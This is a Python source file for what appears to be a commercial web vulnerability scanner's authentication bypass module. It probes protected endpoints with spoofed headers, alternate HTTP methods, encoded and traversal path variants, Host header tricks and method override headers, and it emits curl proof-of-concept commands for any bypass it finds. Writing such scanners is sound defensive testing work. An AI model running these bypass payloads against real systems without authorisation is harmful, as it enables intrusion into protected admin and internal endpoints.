"""
Authentication Bypass Scanner

Enterprise-grade authentication bypass testing including:
- Header manipulation bypass (X-Original-URL, X-Forwarded-For, etc.)
- HTTP method bypass
- Path manipulation bypass
- Case sensitivity bypass

CWE Coverage:
- CWE-287: Improper Authentication
- CWE-288: Authentication Bypass Using an Alternate Path or Channel

Author: PetNTester AI Enterprise
Version: 2.0.0
"""

from __future__ import annotations

from typing import TYPE_CHECKING, Any
from urllib.parse import urljoin

import httpx

from scanning.vuln_scanner import Finding
from utils.exploitation_helper import ExploitationHelper, Difficulty
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter

from .auth_base import AUTH_BYPASS_HEADERS, PROTECTED_PATHS

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


class AuthBypassScanner:
    """
    Authentication Bypass Scanner

    Tests for authentication bypass using various techniques
    including header manipulation, method tampering, and path tricks.
    """

    def __init__(self, settings: Settings) -> None:
        self.timeout = settings.timeouts.request_timeout

    async def scan(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Comprehensive authentication bypass scan.
        """
        findings = []

        # Extended bypass testing
        bypass_findings = await self._check_auth_bypass_extended(
            base_url, asset_data, rate_limiter
        )
        findings.extend(bypass_findings)

        return findings

    async def _check_auth_bypass_extended(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Extended authentication bypass testing."""
        findings = []

        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for path in PROTECTED_PATHS:
                await rate_limiter.acquire()

                url = urljoin(base_url, path)

                try:
                    # Normal request
                    normal_response = await client.get(url)

                    if normal_response.status_code not in [401, 403]:
                        continue

                    # Test header bypass
                    for headers in AUTH_BYPASS_HEADERS:
                        await rate_limiter.acquire()
                        bypass_response = await client.get(url, headers=headers)

                        if bypass_response.status_code == 200:
                            # Generate POC for header bypass
                            header_str = " ".join(f"-H '{k}: {v}'" for k, v in headers.items())
                            poc = {
                                "working_payload": str(headers),
                                "curl_command": f"curl -s {header_str} '{url}'",
                                "exploitation_steps": [
                                    f"1. Access {url} normally → {normal_response.status_code} (blocked)",
                                    f"2. Add bypass headers: {list(headers.keys())}",
                                    f"3. Access now returns {bypass_response.status_code} (allowed)",
                                    "4. Extract sensitive data from the protected endpoint",
                                ],
                                "impact_demo": "Full access to protected admin/internal endpoints without authentication",
                                "difficulty": "Easy",
                                "prerequisites": ["None - unauthenticated attack"],
                            }
                            findings.append(Finding(
                                type="authentication",
                                name="Authentication Bypass via Headers",
                                severity="CRITICAL",
                                description="Protected resource accessible with special headers.",
                                host=base_url,
                                matched_at=url,
                                evidence=[
                                    f"Normal: {normal_response.status_code}",
                                    f"Headers: {headers}",
                                    f"Bypass: {bypass_response.status_code}",
                                ],
                                cvss_score=9.8,
                                cwe="CWE-287",
                                remediation="Implement authentication at application level. "
                                           "Do not trust HTTP headers for auth decisions.",
                                metadata={"poc": poc},
                            ).to_dict())
                            break

                    # Test HTTP method bypass
                    bypass_methods = ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"]
                    for method in bypass_methods:
                        await rate_limiter.acquire()
                        try:
                            method_response = await client.request(method, url)
                            if method_response.status_code == 200:
                                # Generate POC for method bypass
                                poc = {
                                    "working_payload": f"HTTP {method} instead of GET",
                                    "curl_command": f"curl -s -X {method} '{url}'",
                                    "exploitation_steps": [
                                        f"1. Access {url} with GET → {normal_response.status_code} (blocked)",
                                        f"2. Change HTTP method to {method}",
                                        f"3. Access now returns {method_response.status_code} (allowed)",
                                        "4. Interact with protected endpoint using alternative method",
                                    ],
                                    "impact_demo": f"Access to protected endpoint via {method} method",
                                    "difficulty": "Easy",
                                    "prerequisites": ["None - unauthenticated attack"],
                                }
                                findings.append(Finding(
                                    type="authentication",
                                    name="Authentication Bypass via HTTP Method",
                                    severity="HIGH",
                                    description=f"Protected resource accessible via {method} method.",
                                    host=base_url,
                                    matched_at=url,
                                    evidence=[
                                        f"GET: {normal_response.status_code}",
                                        f"{method}: {method_response.status_code}",
                                    ],
                                    cvss_score=8.1,
                                    cwe="CWE-287",
                                    remediation="Apply authentication to all HTTP methods.",
                                    metadata={"poc": poc},
                                ).to_dict())
                                break
                        except (httpx.HTTPError, httpx.TimeoutException, OSError):
                            continue

                    # Test path manipulation bypass (ENHANCED for API Gateway)
                    # These techniques target differences between gateway and backend path parsing
                    path_variants = [
                        # Basic trailing variations
                        path + "/",
                        path + "//",
                        path + "/./",
                        # URL encoding bypasses
                        path + "/%2e/",
                        path.replace("/", "%2f"),  # Encoded slash
                        path.replace("/", "%252f"),  # Double encoded slash
                        # Case sensitivity
                        path.upper(),
                        path.lower(),
                        path[0].upper() + path[1:],  # First char uppercase
                        # Suffix confusion
                        path + "?",
                        path + "#",
                        path + ";",
                        path + "%00",
                        path + ".json",
                        path + ".html",
                        path + ".css",  # Sometimes allowed by WAF rules
                        path + ".js",
                        path + "..;/",  # Tomcat path param
                        # Path traversal confusion
                        path + "/../" + path.split("/")[-1],
                        "/." + path,
                        "/.." + path,
                        # Unicode normalization bypass
                        path.replace("a", "%c0%a1") if "a" in path else path,
                        # HTTP parameter pollution
                        path + "?foo=bar",
                        path + "?__proto__=",
                        # Version API confusion
                        path.replace("/v1/", "/v2/") if "/v1/" in path else path,
                        path.replace("/api/", "/API/") if "/api/" in path else path,
                    ]

                    for variant in path_variants:
                        if variant == path:  # Skip if variant is same as original
                            continue
                        await rate_limiter.acquire()
                        variant_url = urljoin(base_url, variant)
                        try:
                            variant_response = await client.get(variant_url)
                            if variant_response.status_code == 200:
                                # Generate POC for path manipulation bypass
                                poc = {
                                    "working_payload": variant,
                                    "curl_command": f"curl -s '{variant_url}'",
                                    "exploitation_steps": [
                                        f"1. Access {path} → {normal_response.status_code} (blocked)",
                                        f"2. Modify path to: {variant}",
                                        f"3. Access now returns {variant_response.status_code} (allowed)",
                                        "4. Access protected resources using path manipulation",
                                    ],
                                    "impact_demo": "Bypass authentication by manipulating URL path",
                                    "difficulty": "Easy",
                                    "prerequisites": ["None - unauthenticated attack"],
                                }
                                findings.append(Finding(
                                    type="authentication",
                                    name="Authentication Bypass via Path Manipulation",
                                    severity="HIGH",
                                    description="Protected resource accessible via path manipulation.",
                                    host=base_url,
                                    matched_at=variant_url,
                                    evidence=[
                                        f"Original: {path} -> {normal_response.status_code}",
                                        f"Bypass: {variant} -> {variant_response.status_code}",
                                    ],
                                    cvss_score=8.1,
                                    cwe="CWE-287",
                                    remediation="Normalize paths before authentication check. "
                                               "Use strict path matching.",
                                    metadata={"poc": poc},
                                ).to_dict())
                                break
                        except (httpx.HTTPError, httpx.TimeoutException, OSError):
                            continue

                    # =============================================================
                    # API GATEWAY SPECIFIC BYPASS TECHNIQUES (HIGH VALUE)
                    # These target differences between gateway and backend routing
                    # =============================================================

                    # Test Host header manipulation
                    host_bypass_headers = [
                        {"Host": "localhost"},
                        {"Host": "127.0.0.1"},
                        {"Host": "internal.local"},
                        {"X-Forwarded-Host": "localhost"},
                        {"X-Host": "localhost"},
                        {"X-Forwarded-Server": "localhost"},
                        # HTTP Request Smuggling related
                        {"Transfer-Encoding": "chunked", "Content-Length": "0"},
                    ]

                    for headers in host_bypass_headers:
                        await rate_limiter.acquire()
                        try:
                            host_response = await client.get(url, headers=headers)
                            if host_response.status_code == 200:
                                findings.append(Finding(
                                    type="authentication",
                                    name="API Gateway Bypass via Host Header",
                                    severity="CRITICAL",
                                    description=f"Protected endpoint accessible by manipulating Host header. "
                                               f"This indicates the API gateway trusts Host/X-Forwarded-Host headers.",
                                    host=base_url,
                                    matched_at=url,
                                    evidence=[
                                        f"Normal request: {normal_response.status_code}",
                                        f"With {list(headers.keys())[0]}: {host_response.status_code}",
                                        f"Headers used: {headers}",
                                    ],
                                    cvss_score=9.1,
                                    cwe="CWE-287",
                                    remediation="Do not trust Host headers for routing decisions. "
                                               "Validate Host header against allowlist at gateway level.",
                                    metadata={
                                        "poc": {
                                            "curl_command": f"curl -s -H '{list(headers.keys())[0]}: {list(headers.values())[0]}' '{url}'",
                                            "difficulty": "Easy",
                                        }
                                    },
                                ).to_dict())
                                break
                        except (httpx.HTTPError, httpx.TimeoutException, OSError):
                            continue

                    # Test HTTP method override headers (common gateway feature)
                    method_override_tests = [
                        {"X-HTTP-Method-Override": "GET"},
                        {"X-HTTP-Method": "GET"},
                        {"X-Method-Override": "GET"},
                        {"_method": "GET"},
                    ]

                    for headers in method_override_tests:
                        await rate_limiter.acquire()
                        try:
                            # Send POST but override to GET
                            override_response = await client.post(url, headers=headers)
                            if override_response.status_code == 200 and normal_response.status_code in [401, 403]:
                                findings.append(Finding(
                                    type="authentication",
                                    name="API Gateway Method Override Bypass",
                                    severity="HIGH",
                                    description=f"Authentication bypassed using HTTP method override header. "
                                               f"Gateway respects {list(headers.keys())[0]} header.",
                                    host=base_url,
                                    matched_at=url,
                                    evidence=[
                                        f"GET request: {normal_response.status_code}",
                                        f"POST with override header: {override_response.status_code}",
                                    ],
                                    cvss_score=8.1,
                                    cwe="CWE-287",
                                    remediation="Disable method override features in production. "
                                               "Apply auth checks after method override resolution.",
                                ).to_dict())
                                break
                        except (httpx.HTTPError, httpx.TimeoutException, OSError):
                            continue

                except (httpx.HTTPError, httpx.TimeoutException, OSError) as e:
                    logger.debug(f"Auth bypass check failed for {url}: {e}")

        return findings
